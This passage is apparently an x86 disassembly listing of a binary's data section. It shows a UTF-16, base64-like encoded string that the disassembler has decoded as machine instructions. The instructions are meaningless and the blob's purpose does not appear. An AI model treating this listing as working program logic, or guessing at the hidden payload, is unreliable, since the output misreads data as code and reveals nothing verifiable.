  409c1d:	00 43 00             	add    %al,0x0(%ebx)
  409c20:	51                   	push   %ecx
  409c21:	00 67 00             	add    %ah,0x0(%edi)
  409c24:	48                   	dec    %eax
  409c25:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  409c29:	00 70 00             	add    %dh,0x0(%eax)
  409c2c:	6f                   	outsl  %ds:(%esi),(%dx)
  409c2d:	00 73 00             	add    %dh,0x0(%ebx)
  409c30:	42                   	inc    %edx
  409c31:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  409c35:	00 49 00             	add    %cl,0x0(%ecx)
  409c38:	77 00                	ja     0x409c3a
  409c3a:	54                   	push   %esp
  409c3b:	00 4a 00             	add    %cl,0x0(%edx)
  409c3e:	51                   	push   %ecx
  409c3f:	00 76 00             	add    %dh,0x0(%esi)
  409c42:	55                   	push   %ebp
  409c43:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c46:	53                   	push   %ebx
  409c47:	00 36                	add    %dh,(%esi)
  409c49:	00 30                	add    %dh,(%eax)
  409c4b:	00 53 00             	add    %dl,0x0(%ebx)
  409c4e:	59                   	pop    %ecx
  409c4f:	00 72 00             	add    %dh,0x0(%edx)
  409c52:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  409c56:	34 00                	xor    $0x0,%al
  409c58:	61                   	popa
  409c59:	00 61 00             	add    %ah,0x0(%ecx)
  409c5c:	4d                   	dec    %ebp
  409c5d:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  409c61:	00 46 00             	add    %al,0x0(%esi)
  409c64:	39 00                	cmp    %eax,(%eax)
  409c66:	54                   	push   %esp
  409c67:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  409c6b:	00 6e 00             	add    %ch,0x0(%esi)
  409c6e:	41                   	inc    %ecx
  409c6f:	00 31                	add    %dh,(%ecx)
  409c71:	00 45 00             	add    %al,0x0(%ebp)
  409c74:	45                   	inc    %ebp
  409c75:	00 36                	add    %dh,(%esi)
  409c77:	00 2b                	add    %ch,(%ebx)
  409c79:	00 41 00             	add    %al,0x0(%ecx)
  409c7c:	45                   	inc    %ebp
  409c7d:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  409c81:	00 59 00             	add    %bl,0x0(%ecx)
  409c84:	57                   	push   %edi
  409c85:	00 69 00             	add    %ch,0x0(%ecx)
  409c88:	53                   	push   %ebx
  409c89:	00 42 00             	add    %al,0x0(%edx)
  409c8c:	31 00                	xor    %eax,(%eax)
  409c8e:	4e                   	dec    %esi
  409c8f:	00 76 00             	add    %dh,0x0(%esi)
  409c92:	61                   	popa
  409c93:	00 77 00             	add    %dh,0x0(%edi)
  409c96:	54                   	push   %esp
  409c97:	00 43 00             	add    %al,0x0(%ebx)
  409c9a:	62 00                	bound  %eax,(%eax)
  409c9c:	56                   	push   %esi
  409c9d:	00 48 00             	add    %cl,0x0(%eax)
  409ca0:	58                   	pop    %eax
  409ca1:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  409ca5:	00 53 00             	add    %dl,0x0(%ebx)
  409ca8:	6c                   	insb   (%dx),%es:(%edi)
  409ca9:	00 6a 00             	add    %ch,0x0(%edx)
  409cac:	62 00                	bound  %eax,(%eax)
  409cae:	47                   	inc    %edi
  409caf:	00 6b 00             	add    %ch,0x0(%ebx)
  409cb2:	6e                   	outsb  %ds:(%esi),(%dx)
  409cb3:	00 58 00             	add    %bl,0x0(%eax)
  409cb6:	7a 00                	jp     0x409cb8
  409cb8:	45                   	inc    %ebp
  409cb9:	00 78 00             	add    %bh,0x0(%eax)
  409cbc:	33 00                	xor    (%eax),%eax
  409cbe:	68 00 56 00 53       	push   $0x53005600
  409cc3:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  409cc7:	00 34 00             	add    %dh,(%eax,%eax,1)
  409cca:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  409cce:	6e                   	outsb  %ds:(%esi),(%dx)
  409ccf:	00 53 00             	add    %dl,0x0(%ebx)
  409cd2:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  409cd6:	7a 00                	jp     0x409cd8
  409cd8:	58                   	pop    %eax
  409cd9:	00 55 00             	add    %dl,0x0(%ebp)
  409cdc:	51                   	push   %ecx
  409cdd:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  409ce1:	00 31                	add    %dh,(%ecx)
  409ce3:	00 45 00             	add    %al,0x0(%ebp)
  409ce6:	39 00                	cmp    %eax,(%eax)
  409ce8:	42                   	inc    %edx
  409ce9:	00 36                	add    %dh,(%esi)
  409ceb:	00 4a 00             	add    %cl,0x0(%edx)
  409cee:	4a                   	dec    %edx
  409cef:	00 73 00             	add    %dh,0x0(%ebx)
  409cf2:	32 00                	xor    (%eax),%al
  409cf4:	63 00                	arpl   %eax,(%eax)
  409cf6:	53                   	push   %ebx
  409cf7:	00 49 00             	add    %cl,0x0(%ecx)
  409cfa:	2f                   	das
  409cfb:	00 53 00             	add    %dl,0x0(%ebx)
  409cfe:	37                   	aaa
  409cff:	00 6f 00             	add    %ch,0x0(%edi)
  409d02:	2b 00                	sub    (%eax),%eax
  409d04:	54                   	push   %esp
  409d05:	00 45 00             	add    %al,0x0(%ebp)
  409d08:	70 00                	jo     0x409d0a
  409d0a:	6e                   	outsb  %ds:(%esi),(%dx)
  409d0b:	00 4f 00             	add    %cl,0x0(%edi)
  409d0e:	46                   	inc    %esi
  409d0f:	00 37                	add    %dh,(%edi)
  409d11:	00 65 00             	add    %ah,0x0(%ebp)
  409d14:	4d                   	dec    %ebp
  409d15:	00 65 00             	add    %ah,0x0(%ebp)
  409d18:	54                   	push   %esp
  409d19:	00 4e 00             	add    %cl,0x0(%esi)
  409d1c:	71 00                	jno    0x409d1e
  409d1e:	57                   	push   %edi
  409d1f:	00 53 00             	add    %dl,0x0(%ebx)
  409d22:	47                   	inc    %edi
  409d23:	00 6a 00             	add    %ch,0x0(%edx)
  409d26:	6f                   	outsl  %ds:(%esi),(%dx)
  409d27:	00 59 00             	add    %bl,0x0(%ecx)
  409d2a:	69 00 44 00 43 00    	imul   $0x430044,(%eax),%eax
  409d30:	31 00                	xor    %eax,(%eax)
  409d32:	78 00                	js     0x409d34
  409d34:	70 00                	jo     0x409d36
  409d36:	6d                   	insl   (%dx),%es:(%edi)
  409d37:	00 62 00             	add    %ah,0x0(%edx)
  409d3a:	65 00 54 00 68       	add    %dl,%gs:0x68(%eax,%eax,1)
  409d3f:	00 7a 00             	add    %bh,0x0(%edx)
  409d42:	53                   	push   %ebx
  409d43:	00 55 00             	add    %dl,0x0(%ebp)
  409d46:	69 00 71 00 76 00    	imul   $0x760071,(%eax),%eax
  409d4c:	33 00                	xor    (%eax),%eax
  409d4e:	5a                   	pop    %edx
  409d4f:	00 4d 00             	add    %cl,0x0(%ebp)
  409d52:	59                   	pop    %ecx
  409d53:	00 77 00             	add    %dh,0x0(%edi)
  409d56:	72 00                	jb     0x409d58
  409d58:	4e                   	dec    %esi
  409d59:	00 76 00             	add    %dh,0x0(%esi)
  409d5c:	59                   	pop    %ecx
  409d5d:	00 38                	add    %bh,(%eax)
  409d5f:	00 59 00             	add    %bl,0x0(%ecx)
  409d62:	77 00                	ja     0x409d64
  409d64:	4d                   	dec    %ebp
  409d65:	00 2f                	add    %ch,(%edi)
  409d67:	00 63 00             	add    %ah,0x0(%ebx)
  409d6a:	6b 00 69             	imul   $0x69,(%eax),%eax
  409d6d:	00 6a 00             	add    %ch,0x0(%edx)
  409d70:	69 00 43 00 2b 00    	imul   $0x2b0043,(%eax),%eax
  409d76:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  409d7a:	41                   	inc    %ecx
  409d7b:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  409d7f:	00 73 00             	add    %dh,0x0(%ebx)
  409d82:	6e                   	outsb  %ds:(%esi),(%dx)
  409d83:	00 6d 00             	add    %ch,0x0(%ebp)
  409d86:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  409d8a:	42                   	inc    %edx
  409d8b:	00 4a 00             	add    %cl,0x0(%edx)
  409d8e:	50                   	push   %eax
  409d8f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d92:	70 00                	jo     0x409d94
  409d94:	44                   	inc    %esp
  409d95:	00 56 00             	add    %dl,0x0(%esi)
  409d98:	2f                   	das
  409d99:	00 4b 00             	add    %cl,0x0(%ebx)
  409d9c:	2f                   	das
  409d9d:	00 72 00             	add    %dh,0x0(%edx)
  409da0:	46                   	inc    %esi
  409da1:	00 79 00             	add    %bh,0x0(%ecx)
  409da4:	42                   	inc    %edx
  409da5:	00 52 00             	add    %dl,0x0(%edx)
  409da8:	47                   	inc    %edi
  409da9:	00 73 00             	add    %dh,0x0(%ebx)
  409dac:	63 00                	arpl   %eax,(%eax)
  409dae:	58                   	pop    %eax
  409daf:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  409db3:	00 4f 00             	add    %cl,0x0(%edi)
  409db6:	46                   	inc    %esi
  409db7:	00 51 00             	add    %dl,0x0(%ecx)
  409dba:	71 00                	jno    0x409dbc
  409dbc:	4d                   	dec    %ebp
  409dbd:	00 59 00             	add    %bl,0x0(%ecx)
  409dc0:	4a                   	dec    %edx
  409dc1:	00 7a 00             	add    %bh,0x0(%edx)
  409dc4:	69 00 52 00 36 00    	imul   $0x360052,(%eax),%eax
  409dca:	69 00 4d 00 49 00    	imul   $0x49004d,(%eax),%eax
  409dd0:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  409dd4:	79 00                	jns    0x409dd6
  409dd6:	32 00                	xor    (%eax),%al
  409dd8:	44                   	inc    %esp
  409dd9:	00 68 00             	add    %ch,0x0(%eax)
  409ddc:	6f                   	outsl  %ds:(%esi),(%dx)
  409ddd:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  409de1:	00 72 00             	add    %dh,0x0(%edx)
  409de4:	35 00 34 00 32       	xor    $0x32003400,%eax
  409de9:	00 6f 00             	add    %ch,0x0(%edi)
  409dec:	5a                   	pop    %edx
  409ded:	00 77 00             	add    %dh,0x0(%edi)
  409df0:	62 00                	bound  %eax,(%eax)
  409df2:	4c                   	dec    %esp
  409df3:	00 45 00             	add    %al,0x0(%ebp)
  409df6:	4f                   	dec    %edi
  409df7:	00 4a 00             	add    %cl,0x0(%edx)
  409dfa:	6d                   	insl   (%dx),%es:(%edi)
  409dfb:	00 70 00             	add    %dh,0x0(%eax)
  409dfe:	4a                   	dec    %edx
  409dff:	00 50 00             	add    %dl,0x0(%eax)
  409e02:	66 00 36             	data16 add %dh,(%esi)
  409e05:	00 76 00             	add    %dh,0x0(%esi)
  409e08:	78 00                	js     0x409e0a
  409e0a:	46                   	inc    %esi
  409e0b:	00 73 00             	add    %dh,0x0(%ebx)
  409e0e:	4a                   	dec    %edx
  409e0f:	00 31                	add    %dh,(%ecx)
  409e11:	00 35 00 75 00 70    	add    %dh,0x70007500
  409e17:	00 42 00             	add    %al,0x0(%edx)
  409e1a:	4d                   	dec    %ebp
  409e1b:	00 6b 00             	add    %ch,0x0(%ebx)
  409e1e:	54                   	push   %esp
  409e1f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e22:	6e                   	outsb  %ds:(%esi),(%dx)
  409e23:	00 6f 00             	add    %ch,0x0(%edi)
  409e26:	69 00 57 00 42 00    	imul   $0x420057,(%eax),%eax
  409e2c:	45                   	inc    %ebp
  409e2d:	00 41 00             	add    %al,0x0(%ecx)
  409e30:	75 00                	jne    0x409e32
  409e32:	74 00                	je     0x409e34
  409e34:	56                   	push   %esi
  409e35:	00 7a 00             	add    %bh,0x0(%edx)
  409e38:	38 00                	cmp    %al,(%eax)
  409e3a:	41                   	inc    %ecx
  409e3b:	00 4d 00             	add    %cl,0x0(%ebp)
  409e3e:	38 00                	cmp    %al,(%eax)
  409e40:	42                   	inc    %edx
  409e41:	00 36                	add    %dh,(%esi)
  409e43:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e46:	56                   	push   %esi
  409e47:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e4a:	5a                   	pop    %edx
  409e4b:	00 4b 00             	add    %cl,0x0(%ebx)
  409e4e:	4b                   	dec    %ebx
  409e4f:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  409e53:	00 56 00             	add    %dl,0x0(%esi)
  409e56:	42                   	inc    %edx
  409e57:	00 52 00             	add    %dl,0x0(%edx)
  409e5a:	57                   	push   %edi
  409e5b:	00 7a 00             	add    %bh,0x0(%edx)
  409e5e:	71 00                	jno    0x409e60
  409e60:	62 00                	bound  %eax,(%eax)
  409e62:	35 00 36 00 73       	xor    $0x73003600,%eax
  409e67:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  409e6b:	00 52 00             	add    %dl,0x0(%edx)
  409e6e:	68 00 36 00 41       	push   $0x41003600
  409e73:	00 39                	add    %bh,(%ecx)
  409e75:	00 4e 00             	add    %cl,0x0(%esi)
  409e78:	51                   	push   %ecx
  409e79:	00 6a 00             	add    %ch,0x0(%edx)
  409e7c:	35 00 2f 00 6e       	xor    $0x6e002f00,%eax
  409e81:	00 5a 00             	add    %bl,0x0(%edx)
  409e84:	55                   	push   %ebp
  409e85:	00 51 00             	add    %dl,0x0(%ecx)
  409e88:	64 00 36             	add    %dh,%fs:(%esi)
  409e8b:	00 30                	add    %dh,(%eax)
  409e8d:	00 6e 00             	add    %ch,0x0(%esi)
  409e90:	38 00                	cmp    %al,(%eax)
  409e92:	49                   	dec    %ecx
  409e93:	00 4b 00             	add    %cl,0x0(%ebx)
  409e96:	32 00                	xor    (%eax),%al
  409e98:	58                   	pop    %eax
  409e99:	00 39                	add    %bh,(%ecx)
  409e9b:	00 31                	add    %dh,(%ecx)
  409e9d:	00 35 00 42 00 42    	add    %dh,0x42004200
  409ea3:	00 48 00             	add    %cl,0x0(%eax)
  409ea6:	58                   	pop    %eax
  409ea7:	00 68 00             	add    %ch,0x0(%eax)
  409eaa:	49                   	dec    %ecx
  409eab:	00 5a 00             	add    %bl,0x0(%edx)
  409eae:	6e                   	outsb  %ds:(%esi),(%dx)
  409eaf:	00 39                	add    %bh,(%ecx)
  409eb1:	00 37                	add    %dh,(%edi)
  409eb3:	00 41 00             	add    %al,0x0(%ecx)
  409eb6:	57                   	push   %edi
  409eb7:	00 53 00             	add    %dl,0x0(%ebx)
  409eba:	4f                   	dec    %edi
  409ebb:	00 63 00             	add    %ah,0x0(%ebx)
  409ebe:	75 00                	jne    0x409ec0
  409ec0:	30 00                	xor    %al,(%eax)
  409ec2:	41                   	inc    %ecx
  409ec3:	00 69 00             	add    %ch,0x0(%ecx)
  409ec6:	74 00                	je     0x409ec8
  409ec8:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409ece:	69 00 63 00 62 00    	imul   $0x620063,(%eax),%eax
  409ed4:	71 00                	jno    0x409ed6
  409ed6:	57                   	push   %edi
  409ed7:	00 73 00             	add    %dh,0x0(%ebx)
  409eda:	72 00                	jb     0x409edc
  409edc:	37                   	aaa
  409edd:	00 6d 00             	add    %ch,0x0(%ebp)
  409ee0:	58                   	pop    %eax
  409ee1:	00 62 00             	add    %ah,0x0(%edx)
  409ee4:	76 00                	jbe    0x409ee6
  409ee6:	68 00 76 00 4d       	push   $0x4d007600
  409eeb:	00 76 00             	add    %dh,0x0(%esi)
  409eee:	6d                   	insl   (%dx),%es:(%edi)
  409eef:	00 6d 00             	add    %ch,0x0(%ebp)
  409ef2:	35 00 36 00 44       	xor    $0x44003600,%eax
  409ef7:	00 72 00             	add    %dh,0x0(%edx)
  409efa:	7a 00                	jp     0x409efc
  409efc:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  409f00:	57                   	push   %edi
  409f01:	00 69 00             	add    %ch,0x0(%ecx)
  409f04:	2b 00                	sub    (%eax),%eax
  409f06:	78 00                	js     0x409f08
  409f08:	53                   	push   %ebx
  409f09:	00 45 00             	add    %al,0x0(%ebp)
  409f0c:	52                   	push   %edx
  409f0d:	00 77 00             	add    %dh,0x0(%edi)
  409f10:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  409f14:	6d                   	insl   (%dx),%es:(%edi)
  409f15:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  409f19:	00 39                	add    %bh,(%ecx)
  409f1b:	00 45 00             	add    %al,0x0(%ebp)
  409f1e:	4d                   	dec    %ebp
  409f1f:	00 31                	add    %dh,(%ecx)
  409f21:	00 52 00             	add    %dl,0x0(%edx)
  409f24:	78 00                	js     0x409f26
  409f26:	45                   	inc    %ebp
  409f27:	00 33                	add    %dh,(%ebx)
  409f29:	00 76 00             	add    %dh,0x0(%esi)
  409f2c:	62 00                	bound  %eax,(%eax)
  409f2e:	50                   	push   %eax
  409f2f:	00 37                	add    %dh,(%edi)
  409f31:	00 4d 00             	add    %cl,0x0(%ebp)
  409f34:	6b 00 37             	imul   $0x37,(%eax),%eax
  409f37:	00 63 00             	add    %ah,0x0(%ebx)
  409f3a:	58                   	pop    %eax
  409f3b:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  409f3f:	00 47 00             	add    %al,0x0(%edi)
  409f42:	74 00                	je     0x409f44
  409f44:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  409f47:	00 38                	add    %bh,(%eax)
  409f49:	00 53 00             	add    %dl,0x0(%ebx)
  409f4c:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  409f50:	75 00                	jne    0x409f52
  409f52:	77 00                	ja     0x409f54
  409f54:	6c                   	insb   (%dx),%es:(%edi)
  409f55:	00 65 00             	add    %ah,0x0(%ebp)
  409f58:	33 00                	xor    (%eax),%eax
  409f5a:	4e                   	dec    %esi
  409f5b:	00 7a 00             	add    %bh,0x0(%edx)
  409f5e:	53                   	push   %ebx
  409f5f:	00 7a 00             	add    %bh,0x0(%edx)
  409f62:	48                   	dec    %eax
  409f63:	00 75 00             	add    %dh,0x0(%ebp)
  409f66:	33 00                	xor    (%eax),%eax
  409f68:	78 00                	js     0x409f6a
  409f6a:	6b 00 62             	imul   $0x62,(%eax),%eax
  409f6d:	00 41 00             	add    %al,0x0(%ecx)
  409f70:	6a 00                	push   $0x0
  409f72:	41                   	inc    %ecx
  409f73:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  409f77:	00 69 00             	add    %ch,0x0(%ecx)
  409f7a:	74 00                	je     0x409f7c
  409f7c:	31 00                	xor    %eax,(%eax)
  409f7e:	47                   	inc    %edi
  409f7f:	00 79 00             	add    %bh,0x0(%ecx)
  409f82:	68 00 53 00 6d       	push   $0x6d005300
  409f87:	00 69 00             	add    %ch,0x0(%ecx)
  409f8a:	70 00                	jo     0x409f8c
  409f8c:	5a                   	pop    %edx
  409f8d:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f90:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  409f94:	59                   	pop    %ecx
  409f95:	00 73 00             	add    %dh,0x0(%ebx)
  409f98:	63 00                	arpl   %eax,(%eax)
  409f9a:	62 00                	bound  %eax,(%eax)
  409f9c:	30 00                	xor    %al,(%eax)
  409f9e:	49                   	dec    %ecx
  409f9f:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  409fa3:	00 62 00             	add    %ah,0x0(%edx)
  409fa6:	57                   	push   %edi
  409fa7:	00 52 00             	add    %dl,0x0(%edx)
  409faa:	35 00 48 00 5a       	xor    $0x5a004800,%eax
  409faf:	00 58 00             	add    %bl,0x0(%eax)
  409fb2:	4d                   	dec    %ebp
  409fb3:	00 63 00             	add    %ah,0x0(%ebx)
  409fb6:	7a 00                	jp     0x409fb8
  409fb8:	48                   	dec    %eax
  409fb9:	00 77 00             	add    %dh,0x0(%edi)
  409fbc:	71 00                	jno    0x409fbe
  409fbe:	73 00                	jae    0x409fc0
  409fc0:	6e                   	outsb  %ds:(%esi),(%dx)
  409fc1:	00 78 00             	add    %bh,0x0(%eax)
  409fc4:	53                   	push   %ebx
  409fc5:	00 39                	add    %bh,(%ecx)
  409fc7:	00 7a 00             	add    %bh,0x0(%edx)
  409fca:	49                   	dec    %ecx
  409fcb:	00 58 00             	add    %bl,0x0(%eax)
  409fce:	77 00                	ja     0x409fd0
  409fd0:	75 00                	jne    0x409fd2
  409fd2:	58                   	pop    %eax
  409fd3:	00 6e 00             	add    %ch,0x0(%esi)
  409fd6:	62 00                	bound  %eax,(%eax)
  409fd8:	39 00                	cmp    %eax,(%eax)
  409fda:	41                   	inc    %ecx
  409fdb:	00 57 00             	add    %dl,0x0(%edi)
  409fde:	54                   	push   %esp
  409fdf:	00 65 00             	add    %ah,0x0(%ebp)
  409fe2:	61                   	popa
  409fe3:	00 55 00             	add    %dl,0x0(%ebp)
  409fe6:	72 00                	jb     0x409fe8
  409fe8:	39 00                	cmp    %eax,(%eax)
  409fea:	75 00                	jne    0x409fec
  409fec:	62 00                	bound  %eax,(%eax)
  409fee:	4e                   	dec    %esi
  409fef:	00 76 00             	add    %dh,0x0(%esi)
  409ff2:	62 00                	bound  %eax,(%eax)
  409ff4:	67 00 6d 00          	add    %ch,0x0(%di)
  409ff8:	7a 00                	jp     0x409ffa
  409ffa:	43                   	inc    %ebx
  409ffb:	00 52 00             	add    %dl,0x0(%edx)
  409ffe:	4b                   	dec    %ebx
  409fff:	00 41 00             	add    %al,0x0(%ecx)
  40a002:	4d                   	dec    %ebp
  40a003:	00 55 00             	add    %dl,0x0(%ebp)
  40a006:	33 00                	xor    (%eax),%eax
  40a008:	6f                   	outsl  %ds:(%esi),(%dx)
  40a009:	00 35 00 31 00 47    	add    %dh,0x47003100
  40a00f:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40a013:	00 58 00             	add    %bl,0x0(%eax)
  40a016:	33 00                	xor    (%eax),%eax
  40a018:	6b 00 64             	imul   $0x64,(%eax),%eax
  40a01b:	00 72 00             	add    %dh,0x0(%edx)
  40a01e:	31 00                	xor    %eax,(%eax)
  40a020:	32 00                	xor    (%eax),%al
  40a022:	74 00                	je     0x40a024
  40a024:	4b                   	dec    %ebx
  40a025:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40a029:	00 68 00             	add    %ch,0x0(%eax)
  40a02c:	48                   	dec    %eax
  40a02d:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40a031:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40a035:	00 2b                	add    %ch,(%ebx)
  40a037:	00 42 00             	add    %al,0x0(%edx)
  40a03a:	61                   	popa
  40a03b:	00 4f 00             	add    %cl,0x0(%edi)
  40a03e:	51                   	push   %ecx
  40a03f:	00 61 00             	add    %ah,0x0(%ecx)
  40a042:	6a 00                	push   $0x0
  40a044:	63 00                	arpl   %eax,(%eax)
  40a046:	33 00                	xor    (%eax),%eax
  40a048:	41                   	inc    %ecx
  40a049:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40a04d:	00 63 00             	add    %ah,0x0(%ebx)
  40a050:	68 00 78 00 50       	push   $0x50007800
  40a055:	00 65 00             	add    %ah,0x0(%ebp)
  40a058:	31 00                	xor    %eax,(%eax)
  40a05a:	61                   	popa
  40a05b:	00 73 00             	add    %dh,0x0(%ebx)
  40a05e:	53                   	push   %ebx
  40a05f:	00 37                	add    %dh,(%edi)
  40a061:	00 43 00             	add    %al,0x0(%ebx)
  40a064:	59                   	pop    %ecx
  40a065:	00 33                	add    %dh,(%ebx)
  40a067:	00 35 00 32 00 5a    	add    %dh,0x5a003200
  40a06d:	00 2b                	add    %ch,(%ebx)
  40a06f:	00 5a 00             	add    %bl,0x0(%edx)
  40a072:	31 00                	xor    %eax,(%eax)
  40a074:	32 00                	xor    (%eax),%al
  40a076:	6f                   	outsl  %ds:(%esi),(%dx)
  40a077:	00 77 00             	add    %dh,0x0(%edi)
  40a07a:	42                   	inc    %edx
  40a07b:	00 45 00             	add    %al,0x0(%ebp)
  40a07e:	56                   	push   %esi
  40a07f:	00 39                	add    %bh,(%ecx)
  40a081:	00 62 00             	add    %ah,0x0(%edx)
  40a084:	35 00 74 00 50       	xor    $0x50007400,%eax
  40a089:	00 52 00             	add    %dl,0x0(%edx)
  40a08c:	72 00                	jb     0x40a08e
  40a08e:	2b 00                	sub    (%eax),%eax
  40a090:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a094:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a098:	2f                   	das
  40a099:	00 5a 00             	add    %bl,0x0(%edx)
  40a09c:	45                   	inc    %ebp
  40a09d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0a0:	6c                   	insb   (%dx),%es:(%edi)
  40a0a1:	00 59 00             	add    %bl,0x0(%ecx)
  40a0a4:	39 00                	cmp    %eax,(%eax)
  40a0a6:	69 00 43 00 44 00    	imul   $0x440043,(%eax),%eax
  40a0ac:	70 00                	jo     0x40a0ae
  40a0ae:	59                   	pop    %ecx
  40a0af:	00 79 00             	add    %bh,0x0(%ecx)
  40a0b2:	65 00 32             	add    %dh,%gs:(%edx)
  40a0b5:	00 43 00             	add    %al,0x0(%ebx)
  40a0b8:	4d                   	dec    %ebp
  40a0b9:	00 48 00             	add    %cl,0x0(%eax)
  40a0bc:	48                   	dec    %eax
  40a0bd:	00 57 00             	add    %dl,0x0(%edi)
  40a0c0:	58                   	pop    %eax
  40a0c1:	00 31                	add    %dh,(%ecx)
  40a0c3:	00 7a 00             	add    %bh,0x0(%edx)
  40a0c6:	50                   	push   %eax
  40a0c7:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40a0cb:	00 63 00             	add    %ah,0x0(%ebx)
  40a0ce:	54                   	push   %esp
  40a0cf:	00 68 00             	add    %ch,0x0(%eax)
  40a0d2:	71 00                	jno    0x40a0d4
  40a0d4:	37                   	aaa
  40a0d5:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0d8:	6a 00                	push   $0x0
  40a0da:	43                   	inc    %ebx
  40a0db:	00 7a 00             	add    %bh,0x0(%edx)
  40a0de:	2b 00                	sub    (%eax),%eax
  40a0e0:	75 00                	jne    0x40a0e2
  40a0e2:	4f                   	dec    %edi
  40a0e3:	00 31                	add    %dh,(%ecx)
  40a0e5:	00 32                	add    %dh,(%edx)
  40a0e7:	00 75 00             	add    %dh,0x0(%ebp)
  40a0ea:	4a                   	dec    %edx
  40a0eb:	00 50 00             	add    %dl,0x0(%eax)
  40a0ee:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40a0f2:	45                   	inc    %ebp
  40a0f3:	00 39                	add    %bh,(%ecx)
  40a0f5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0f8:	45                   	inc    %ebp
  40a0f9:	00 45 00             	add    %al,0x0(%ebp)
  40a0fc:	57                   	push   %edi
  40a0fd:	00 75 00             	add    %dh,0x0(%ebp)
  40a100:	39 00                	cmp    %eax,(%eax)
  40a102:	75 00                	jne    0x40a104
  40a104:	69 00 59 00 35 00    	imul   $0x350059,(%eax),%eax
  40a10a:	54                   	push   %esp
  40a10b:	00 36                	add    %dh,(%esi)
  40a10d:	00 52 00             	add    %dl,0x0(%edx)
  40a110:	70 00                	jo     0x40a112
  40a112:	46                   	inc    %esi
  40a113:	00 59 00             	add    %bl,0x0(%ecx)
  40a116:	7a 00                	jp     0x40a118
  40a118:	4c                   	dec    %esp
  40a119:	00 78 00             	add    %bh,0x0(%eax)
  40a11c:	30 00                	xor    %al,(%eax)
  40a11e:	72 00                	jb     0x40a120
  40a120:	70 00                	jo     0x40a122
  40a122:	6a 00                	push   $0x0
  40a124:	6a 00                	push   $0x0
  40a126:	66 00 64 00 7a       	data16 add %ah,0x7a(%eax,%eax,1)
  40a12b:	00 59 00             	add    %bl,0x0(%ecx)
  40a12e:	2f                   	das
  40a12f:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40a133:	00 59 00             	add    %bl,0x0(%ecx)
  40a136:	32 00                	xor    (%eax),%al
  40a138:	4e                   	dec    %esi
  40a139:	00 4e 00             	add    %cl,0x0(%esi)
  40a13c:	34 00                	xor    $0x0,%al
  40a13e:	53                   	push   %ebx
  40a13f:	00 73 00             	add    %dh,0x0(%ebx)
  40a142:	73 00                	jae    0x40a144
  40a144:	30 00                	xor    %al,(%eax)
  40a146:	37                   	aaa
  40a147:	00 55 00             	add    %dl,0x0(%ebp)
  40a14a:	4f                   	dec    %edi
  40a14b:	00 65 00             	add    %ah,0x0(%ebp)
  40a14e:	35 00 34 00 52       	xor    $0x52003400,%eax
  40a153:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40a157:	00 47 00             	add    %al,0x0(%edi)
  40a15a:	58                   	pop    %eax
  40a15b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a15e:	48                   	dec    %eax
  40a15f:	00 2f                	add    %ch,(%edi)
  40a161:	00 48 00             	add    %cl,0x0(%eax)
  40a164:	6c                   	insb   (%dx),%es:(%edi)
  40a165:	00 58 00             	add    %bl,0x0(%eax)
  40a168:	62 00                	bound  %eax,(%eax)
  40a16a:	33 00                	xor    (%eax),%eax
  40a16c:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a170:	2f                   	das
  40a171:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40a175:	00 77 00             	add    %dh,0x0(%edi)
  40a178:	42                   	inc    %edx
  40a179:	00 70 00             	add    %dh,0x0(%eax)
  40a17c:	74 00                	je     0x40a17e
  40a17e:	68 00 6a 00 65       	push   $0x65006a00
  40a183:	00 2b                	add    %ch,(%ebx)
  40a185:	00 62 00             	add    %ah,0x0(%edx)
  40a188:	4f                   	dec    %edi
  40a189:	00 4f 00             	add    %cl,0x0(%edi)
